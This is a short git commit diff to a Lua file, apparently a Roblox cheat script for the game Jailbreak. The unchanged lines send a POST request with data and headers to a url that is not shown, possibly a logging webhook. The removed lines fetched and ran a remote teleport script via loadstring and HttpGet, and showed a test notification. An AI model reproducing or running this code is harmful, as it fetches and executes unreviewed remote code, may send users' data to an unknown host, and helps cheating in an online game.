cad27ef2027f6480971834076c6bf73f653dbca2
The god <92877542+0xSODev@users.noreply.github.com>
2023-03-17 14:47:35 +0100

    Update Jailbreak.lua

--- scripts/Jailbreak.lua
+++ scripts/Jailbreak.lua
@@ -27,16 +27,5 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-
--- Script
-
-local jailtp = loadstring(game:HttpGet("https://raw.githubusercontent.com/Introvert1337/RobloxReleases/main/Scripts/Jailbreak/Teleporation.lua"))();
-
-
-require(game:GetService("ReplicatedStorage").Game.Notification).new({
-    Text = "Test",
-    Duration = 4,
-})
- 
   
   
